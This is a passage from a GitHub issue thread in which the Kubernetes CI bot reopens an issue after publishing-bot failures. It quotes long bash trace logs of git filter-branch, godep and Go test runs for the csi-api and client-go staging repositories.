filtered-branch-base\n>\t++ git show --format=%B -q filtered-branch-base\n>\t++ grep '^Kubernetes-commit: '\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_branch_point_commit=\n>\t++ branch-commit Kubernetes-commit master\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --grep 'Kubernetes-commit: master' --format=%H HEAD\n>\t+ local dst_branch_point_commit=\n>\t+ '[' -z '' ']'\n>\t+ echo 'Couldn'\\''t find a corresponding branch point commit for  as ascendent of origin/master.'\n>\tCouldn't find a corresponding branch point commit for  as ascendent of origin/master.\n>\t+ return 1\n>[05 Sep 18 17:52 UTC]: exit status 1\n>    \t+ '[' '!' 13 -eq 13 ']'\n>    \t+ REPO=csi-api\n>    \t+ SRC_BRANCH=release-1.12\n>    \t+ DST_BRANCH=release-1.12\n>    \t+ DEPS=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0\n>    \t+ REQUIRED=\n>    \t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ SUBDIR=staging/src/k8s.io/csi-api\n>    \t+ SOURCE_REPO_ORG=kubernetes\n>    \t+ SOURCE_REPO_NAME=kubernetes\n>    \t+ shift 9\n>    \t+ BASE_PACKAGE=k8s.io\n>    \t+ IS_LIBRARY=true\n>    \t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ SKIP_TAGS=\n>    \t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS\n>    \t++ dirname /publish_scripts/construct.sh\n>    \t+ SCRIPT_DIR=/publish_scripts\n>    \t+ source /publish_scripts/util.sh\n>    \t++ set -o errexit\n>    \t++ set -o nounset\n>    \t++ set -o pipefail\n>    \t++ set -o xtrace\n>    \t+ echo 'Running garbage collection.'\n>    \t+ git gc --auto\n>    \t+ echo 'Fetching from origin.'\n>    \t+ git fetch origin --no-tags\n>    \t+ echo 'Cleaning up checkout.'\n>    \t+ git rebase --abort\n>    \tNo rebase in progress?\n>    \t+ true\n>    \t+ git reset -q --hard\n>    \t+ git clean -q -f -f -d\n>    \t++ git rev-parse HEAD\n>    \t+ git checkout -q dfbb6007401672afff31c7a0209f72d87fdeb09e\n>    \t+ git branch -D release-1.12\n>    \terror: branch 'release-1.12' not found.\n>    \t+ true\n>    \t+ git remote set-head origin -d\n>    \t+ git rev-parse origin/release-1.12\n>    \t+ echo 'Branch origin/release-1.12 not found. Creating orphan release-1.12 branch.'\n>    \t+ git checkout -q --orphan release-1.12\n>    \t+ git rm -q --ignore-unmatch -rf .\n>    \t+ sync_repo kubernetes kubernetes staging/src/k8s.io/csi-api release-1.12 release-1.12 /go-workspace/src/k8s.io/kubernetes/.git apimachinery:release-1.12,api:release-1.12,client-go:release-9.0 '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local source_repo_org=kubernetes\n>    \t+ local source_repo_name=kubernetes\n>    \t+ local subdirectory=staging/src/k8s.io/csi-api\n>    \t+ local src_branch=release-1.12\n>    \t+ local dst_branch=release-1.12\n>    \t+ local kubernetes_remote=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ local deps=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ shift 9\n>    \t+ local is_library=true\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ readonly subdirectory src_branch dst_branch kubernetes_remote deps is_library\n>    \t+ local new_branch=false\n>    \t+ local orphan=false\n>    \t+ git rev-parse -q --verify HEAD\n>    \t+ echo 'Found repo without release-1.12 branch, creating initial commit.'\n>    \t+ git commit -m 'Initial commit' --allow-empty\n>    \t+ new_branch=true\n>    \t+ orphan=true\n>    \t+ git remote rm upstream\n>    \t+ git remote add upstream /go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ git fetch -q upstream --no-tags\n>    \t+ git branch -D filtered-branch\n>    \t+ git branch -f upstream-branch upstream/release-1.12\n>    \t++ git rev-parse upstream-branch\n>    \t+ echo 'Checked out source commit 2b32d1f55d387e1e183e56dd0897843894365ae1.'\n>    \t+ git checkout -q upstream-branch -b filtered-branch\n>    \t+ git reset -q --hard upstream-branch\n>    \t+ local f_mainline_commits=\n>    \t+ '[' true = true ']'\n>    \t+ '[' release-1.12 = master ']'\n>    \t+ '[' true = true ']'\n>    \t++ git-fork-point upstream/release-1.12 upstream/master\n>    \t++ head -1\n>    \t+++ git rev-list upstream/master --first-parent\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list upstream/release-1.12 --first-parent\n>    \t+ local k_branch_point_commit=d0439d417b0563d44c65b6e400e2070964dea7d1\n>    \t+ '[' -z d0439d417b0563d44c65b6e400e2070964dea7d1 ']'\n>    \t+ echo 'Using branch point d0439d417b0563d44c65b6e400e2070964dea7d1 as new starting point for new branch release-1.12.'\n>    \t+ git branch -f filtered-branch-base d0439d417b0563d44c65b6e400e2070964dea7d1\n>    \t+ echo 'Rewriting upstream branch release-1.12 to only include commits for staging/src/k8s.io/csi-api.'\n>    \t+ filter-branch Kubernetes-commit staging/src/k8s.io/csi-api 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local subdirectory=staging/src/k8s.io/csi-api\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ echo 'Running git filter-branch ...'\n>    \t+ local index_filter=\n>    \t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ patterns=()\n>    \t+ local patterns\n>    \t+ local p=\n>    \t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>    \t+ IFS=' '\n>    \t+ read -ra patterns\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>    \t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/csi-api -- filtered-branch filtered-branch-base\n>    \tWARNING: Ref 'refs/heads/filtered-branch-base' is unchanged\n>    \t++ kube-commit Kubernetes-commit filtered-branch-base\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ commit-message filtered-branch-base\n>    \t++ git show --format=%B -q filtered-branch-base\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t+ local k_branch_point_commit=\n>    \t++ branch-commit Kubernetes-commit master\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ git log --grep 'Kubernetes-commit: master' --format=%H HEAD\n>    \t+ local dst_branch_point_commit=\n>    \t+ '[' -z '' ']'\n>    \t+ echo 'Couldn'\\''t find a corresponding branch point commit for  as ascendent of origin/master.'\n>    \t+ return 1\n>\n>[05 Sep 18 17:52 UTC]: exit status 1```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-419399739):\n\n>/reopen\n>\n>The last publishing run failed: exit status 128\n>```\n>...38a2c5af3d99b7ca.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b b16193f435cefa70de14823738a2c5af3d99b7ca ../kube-commits-apimachinery-release-1.10\n>\tChecking out k8s.io/apimachinery to e386b2658ed20923da8cc9250e552f082899a1ee\n>\t+ '[' -z e386b2658ed20923da8cc9250e552f082899a1ee ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to e386b2658ed20923da8cc9250e552f082899a1ee'\n>\t+ git checkout -q e386b2658ed20923da8cc9250e552f082899a1ee\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\tLooking up which commit in the release-1.10 branch of k8s.io/api corresponds to k8s.io/kubernetes commit b16193f435cefa70de14823738a2c5af3d99b7ca.\n>\t+ local dep=api\n>\t+ local branch=release-1.10\n>\t+ echo 'Looking up which commit in the release-1.10 branch of k8s.io/api corresponds to k8s.io/kubernetes commit b16193f435cefa70de14823738a2c5af3d99b7ca.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b b16193f435cefa70de14823738a2c5af3d99b7ca ../kube-commits-api-release-1.10\n>\t+ '[' -z 0f11257a8a25954878633ebdc9841c67d8f83bdb ']'\n>\t+ pushd ../api\n>\t+ echo 'Checking out k8s.io/api to 0f11257a8a25954878633ebdc9841c67d8f83bdb'\n>\t+ git checkout -q 0f11257a8a25954878633ebdc9841c67d8f83bdb\n>\tChecking out k8s.io/api to 0f11257a8a25954878633ebdc9841c67d8f83bdb\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-7.0 '!=' master ']'\n>\t+ echo 'Removing complete vendor/ on non-master branch because this is a library.'\n>\t+ rm -rf vendor/\n>\tRemoving complete vendor/ on non-master branch because this is a library.\n>\t+ git add Godeps/Godeps.json\n>\t+ git add vendor/ --ignore-errors\n>\t+ true\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\tGodeps.json hasn't changed!\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-7.0 '!=' master ']'\n>\t+ '[' -d vendor/ ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code 745ca830039794f7b927b8a2c2a58dcc1e8a0a72\n>\tRemove redundant godep commits on-top of 745ca830039794f7b927b8a2c2a58dcc1e8a0a72.\n>\t+ echo 'Remove redundant godep commits on-top of 745ca830039794f7b927b8a2c2a58dcc1e8a0a72.'\n>\t+ git reset --soft -q 745ca830039794f7b927b8a2c2a58dcc1e8a0a72\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/client-go\n>\t+ local repo=client-go\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n '745ca83 Merge pull request #67393 from nikhita/automated-cherry-pick-of-#66249-upstream-release-1.10' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-client-go-release-7.0'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-client-go-release-7.0\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-7.0\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=745ca830039794f7b927b8a2c2a58dcc1e8a0a72\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-client-go-release-7.0.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-client-go-release-7.0.sh\n>\t+ [[ -z } ]]\n>\t+ git checkout release-7.0\n>\tAlready on 'release-7.0'\n>\tYour branch is up-to-date with 'origin/release-7.0'.\n>[07 Sep 18 10:31 UTC]: Running smoke tests for branch release-7.0\n>[07 Sep 18 10:31 UTC]: /bin/bash -xec \"godep restore\\ngo build ./...\\ngo test $(go list ./... | grep -v /vendor/)\\n\"\n>\t+ godep restore\n>\t+ go build ./...\n>\t++ go list ./...\n>\t++ grep -v /vendor/\n>\t+ go test k8s.io/client-go/discovery k8s.io/client-go/discovery/cached k8s.io/client-go/discovery/fake k8s.io/client-go/dynamic k8s.io/client-go/dynamic/fake k8s.io/client-go/examples/create-update-delete-deployment k8s.io/client-go/examples/in-cluster-client-configuration k8s.io/client-go/examples/out-of-cluster-client-configuration k8s.io/client-go/examples/workqueue k8s.io/client-go/informers k8s.io/client-go/informers/admissionregistration k8s.io/client-go/informers/admissionregistration/v1alpha1 k8s.io/client-go/informers/admissionregistration/v1beta1 k8s.io/client-go/informers/apps k8s.io/client-go/informers/apps/v1 k8s.io/client-go/informers/apps/v1beta1 k8s.io/client-go/informers/apps/v1beta2 k8s.io/client-go/informers/autoscaling k8s.io/client-go/informers/autoscaling/v1 k8s.io/client-go/informers/autoscaling/v2beta1 k8s.io/client-go/informers/batch k8s.io/client-go/informers/batch/v1 k8s.io/client-go/informers/batch/v1beta1 k8s.io/client-go/informers/batch/v2alpha1 k8s.io/client-go/informers/certificates k8s.io/client-go/informers/certificates/v1beta1 k8s.io/client-go/informers/core k8s.io/client-go/informers/core/v1 k8s.io/client-go/informers/events k8s.io/client-go/informers/events/v1beta1 k8s.io/client-go/informers/extensions k8s.io/client-go/informers/extensions/v1beta1 k8s.io/client-go/informers/internalinterfaces k8s.io/client-go/informers/networking k8s.io/client-go/informers/networking/v1 k8s.io/client-go/informers/policy k8s.io/client-go/informers/policy/v1beta1 k8s.io/client-go/informers/rbac k8s.io/client-go/informers/rbac/v1 k8s.io/client-go/informers/rbac/v1alpha1 k8s.io/client-go/informers/rbac/v1beta1 k8s.io/client-go/informers/scheduling k8s.io/client-go/informers/scheduling/v1alpha1 k8s.io/client-go/informers/settings k8s.io/client-go/informers/settings/v1alpha1 k8s.io/client-go/informers/storage k8s.io/client-go/informers/storage/v1 k8s.io/client-go/informers/storage/v1alpha1 k8s.io/client-go/informers/storage/v1beta1 k8s.io/client-go/kubernetes k8s.io/client-go/kubernetes/fake k8s.io/client-go/kubernetes/scheme k8s.io/client-go/kubernetes/typed/admissionregistration/v1alpha1 k8s.io/client-go/kubernetes/typed/admissionregistration/v1alpha1/fake k8s.io/client-go/kubernetes/typed/admissionregistration/v1beta1 k8s.io/client-go/kubernetes/typed/admissionregistration/v1beta1/fake k8s.io/client-go/kubernetes/typed/apps/v1 k8s.io/client-go/kubernetes/typed/apps/v1/fake k8s.io/client-go/kubernetes/typed/apps/v1beta1 k8s.io/client-go/kubernetes/typed/apps/v1beta1/fake k8s.io/client-go/kubernetes/typed/apps/v1beta2 k8s.io/client-go/kubernetes/typed/apps/v1beta2/fake k8s.io/client-go/kubernetes/typed/authentication/v1 k8s.io/client-go/kubernetes/typed/authentication/v1/fake k8s.io/client-go/kubernetes/typed/authentication/v1beta1 k8s.io/client-go/kubernetes/typed/authentication/v1beta1/fake k8s.io/client-go/kubernetes/typed/authorization/v1 k8s.io/client-go/kubernetes/typed/authorization/v1/fake k8s.io/client-go/kubernetes/typed/authorization/v1beta1 k8s.io/client-go/kubernetes/typed/authorization/v1beta1/fake k8s.io/client-go/kubernetes/typed/autoscaling/v1 k8s.io/client-go/kubernetes/typed/autoscaling/v1/fake k8s.io/client-go/kubernetes/typed/autoscaling/v2beta1 k8s.io/client-go/kubernetes/typed/autoscaling/v2beta1/fake k8s.io/client-go/kubernetes/typed/batch/v1 k8s.io/client-go/kubernetes/typed/batch/v1/fake k8s.io/client-go/kubernetes/typed/batch/v1beta1 k8s.io/client-go/kubernetes/typed/batch/v1beta1/fake k8s.io/client-go/kubernetes/typed/batch/v2alpha1 k8s.io/client-go/kubernetes/typed/batch/v2alpha1/fake k8s.io/client-go/kubernetes/typed/certificates/v1beta1 k8s.io/client-go/kubernetes/typed/certificates/v1beta1/fake k8s.io/client-go/kubernetes/typed/core/v1 k8s.io/client-go/kubernetes/typed/core/v1/fake k8s.io/client-go/kubernetes/typed/events/v1beta1 k8s.io/client-go/kubernetes/typed/events/v1beta1/fake k8s.io/client-go/kubernetes/typed/extensions/v1beta1 k8s.io/client-go/kubernetes/typed/extensions/v1beta1/fake k8s.io/client-go/kubernetes/typed/networking/v1 k8s.io/client-go/kubernetes/typed/networking/v1/fake k8s.io/client-go/kubernetes/typed/policy/v1beta1 k8s.io/client-go/kubernetes/typed/policy/v1beta1/fake k8s.io/client-go/kubernetes/typed/rbac/v1 k8s.io/client-go/kubernetes/typed/rbac/v1/fake k8s.io/client-go/kubernetes/typed/rbac/v1alpha1 k8s.io/client-go/kubernetes/typed/rbac/v1alpha1/fake k8s.io/client-go/kubernetes/typed/rbac/v1beta1 k8s.io/client-go/kubernetes/typed/rbac/v1beta1/fake k8s.io/client-go/kubernetes/typed/scheduling/v1alpha1 k8s.io/client-go/kubernetes/typed/scheduling/v1alpha1/fake k8s.io/client-go/kubernetes/typed/settings/v1alpha1 k8s.io/client-go/kubernetes/typed/settings/v1alpha1/fake k8s.io/client-go/kubernetes/typed/storage/v1 k8s.io/client-go/kubernetes/typed/storage/v1/fake k8s.io/client-go/kubernetes/typed/storage/v1alpha1 k8s.io/client-go/kubernetes/typed/storage/v1alpha1/fake k8s.io/client-go/kubernetes/typed/storage/v1beta1 k8s.io/client-go/kubernetes/typed/storage/v1beta1/fake k8s.io/client-go/listers/admissionregistration/v1alpha1 k8s.io/client-go/listers/admissionregistration/v1beta1 k8s.io/client-go/listers/apps/v1 k8s.io/client-go/listers/apps/v1beta1 k8s.io/client-go/listers/apps/v1beta2 k8s.io/client-go/listers/authentication/v1 k8s.io/client-go/listers/authentication/v1beta1 k8s.io/client-go/listers/authorization/v1 k8s.io/client-go/listers/authorization/v1beta1 k8s.io/client-go/listers/autoscaling/v1 k8s.io/client-go/listers/autoscaling/v2beta1 k8s.io/client-go/listers/batch/v1 k8s.io/client-go/listers/batch/v1beta1 k8s.io/client-go/listers/batch/v2alpha1 k8s.io/client-go/listers/certificates/v1beta1 k8s.io/client-go/listers/core/v1 k8s.io/client-go/listers/events/v1beta1 k8s.io/client-go/listers/extensions/v1beta1 k8s.io/client-go/listers/imagepolicy/v1alpha1 k8s.io/client-go/listers/networking/v1 k8s.io/client-go/listers/policy/v1beta1 k8s.io/client-go/listers/rbac/v1 k8s.io/client-go/listers/rbac/v1alpha1 k8s.io/client-go/listers/rbac/v1beta1 k8s.io/client-go/listers/scheduling/v1alpha1 k8s.io/client-go/listers/settings/v1alpha1 k8s.io/client-go/listers/storage/v1 k8s.io/client-go/listers/storage/v1alpha1 k8s.io/client-go/listers/storage/v1beta1 k8s.io/client-go/pkg/apis/clientauthentication k8s.io/client-go/pkg/apis/clientauthentication/install k8s.io/client-go/pkg/apis/clientauthentication/v1alpha1 k8s.io/client-go/pkg/version k8s.io/client-go/plugin/pkg/client/auth k8s.io/client-go/plugin/pkg/client/auth/azure k8s.io/client-go/plugin/pkg/client/auth/exec k8s.io/client-go/plugin/pkg/client/auth/gcp k8s.io/client-go/plugin/pkg/client/auth/oidc k8s.io/client-go/plugin/pkg/client/auth/openstack k8s.io/client-go/rest k8s.io/client-go/rest/fake k8s.io/client-go/rest/watch k8s.io/client-go/scale k8s.io/client-go/scale/fake k8s.io/client-go/scale/scheme k8s.io/client-go/scale/scheme/appsint k8s.io/client-go/scale/scheme/appsv1beta1 k8s.io/client-go/scale/scheme/appsv1beta2 k8s.io/client-go/scale/scheme/autoscalingv1 k8s.io/client-go/scale/scheme/extensionsint k8s.io/client-go/scale/scheme/extensionsv1beta1 k8s.io/client-go/testing k8s.io/client-go/third_party/forked/golang/template k8s.io/client-go/tools/auth k8s.io/client-go/tools/bootstrap/token/api k8s.io/client-go/tools/bootstrap/token/util k8s.io/client-go/tools/cache k8s.io/client-go/tools/cache/testing k8s.io/client-go/tools/clientcmd k8s.io/client-go/tools/clientcmd/api k8s.io/client-go/tools/clientcmd/api/latest k8s.io/client-go/tools/clientcmd/api/v1 k8s.io/client-go/tools/leaderelection k8s.io/client-go/tools/leaderelection/resourcelock k8s.io/client-go/tools/metrics k8s.io/client-go/tools/pager k8s.io/client-go/tools/portforward k8s.io/client-go/tools/record k8s.io/client-go/tools/reference k8s.io/client-go/tools/remotecommand k8s.io/client-go/transport k8s.io/client-go/transport/spdy k8s.io/client-go/util/buffer k8s.io/client-go/util/cert k8s.io/client-go/util/cert/triple k8s.io/client-go/util/certificate k8s.io/client-go/util/certificate/csr k8s.io/client-go/util/exec k8s.io/client-go/util/flowcontrol k8s.io/client-go/util/homedir k8s.io/client-go/util/integer k8s.io/client-go/util/jsonpath k8s.io/client-go/util/retry k8s.io/client-go/util/testing k8s.io/client-go/util/workqueue\n>\tok  \tk8s.io/client-go/discovery\t0.413s\n>\tok  \tk8s.io/client-go/discovery/cached\t0.177s\n>\tok  \tk8s.io/client-go/discovery/fake\t0.040s\n>\tok  \tk8s.io/client-go/dynamic\t0.211s\n>\t?   \tk8s.io/client-go/dynamic/fake\t[no test files]\n>\t?   \tk8s.io/client-go/examples/create-update-delete-deployment\t[no test files]\n>\t?   \tk8s.io/client-go/examples/in-cluster-client-configuration\t[no test files]\n>\t?   \tk8s.io/client-go/examples/out-of-cluster-client-configuration\t[no test files]\n>\t?   \tk8s.io/client-go/examples/workqueue\t[no test files]\n>\t?   \tk8s.io/client-go/informers\t[no test files]\n>\t?   \tk8s.io/client-go/informers/admissionregistration\t[no test files]\n>\t?   \tk8s.io/client-go/informers/admissionregistration/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/admissionregistration/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/apps\t[no test files]\n>\t?   \tk8s.io/client-go/informers/apps/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/apps/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/apps/v1beta2\t[no test files]\n>\t?   \tk8s.io/client-go/informers/autoscaling\t[no test files]\n>\t?   \tk8s.io/client-go/informers/autoscaling/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/autoscaling/v2beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/batch\t[no test files]\n>\t?   \tk8s.io/client-go/informers/batch/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/batch/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/batch/v2alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/certificates\t[no test files]\n>\t?   \tk8s.io/client-go/informers/certificates/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/core\t[no test files]\n>\t?   \tk8s.io/client-go/informers/core/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/events\t[no test files]\n>\t?   \tk8s.io/client-go/informers/events/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/extensions\t[no test files]\n>\t?   \tk8s.io/client-go/informers/extensions/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/internalinterfaces\t[no test files]\n>\t?   \tk8s.io/client-go/informers/networking\t[no test files]\n>\t?   \tk8s.io/client-go/informers/networking/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/policy\t[no test files]\n>\t?   \tk8s.io/client-go/informers/policy/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/rbac\t[no test files]\n>\t?   \tk8s.io/client-go/informers/rbac/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/rbac/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/rbac/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/scheduling\t[no test files]\n>\t?   \tk8s.io/client-go/informers/scheduling/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/settings\t[no test files]\n>\t?   \tk8s.io/client-go/informers/settings/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/storage\t[no test files]\n>\t?   \tk8s.io/client-go/informers/storage/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/storage/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/storage/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/scheme\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/admissionregistration/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/admissionregistration/v1alpha1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/admissionregistration/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/admissionregistration/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/apps/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/apps/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/apps/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/apps/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/apps/v1beta2\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/apps/v1beta2/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authentication/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authentication/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authentication/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authentication/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authorization/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authorization/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authorization/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authorization/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/autoscaling/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/autoscaling/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/autoscaling/v2beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/autoscaling/v2beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/batch/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/batch/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/batch/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/batch/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/batch/v2alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/batch/v2alpha1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/certificates/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/certificates/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/core/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/core/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/events/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/events/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/extensions/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/extensions/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/networking/v1\t[no test files]\n>\t?   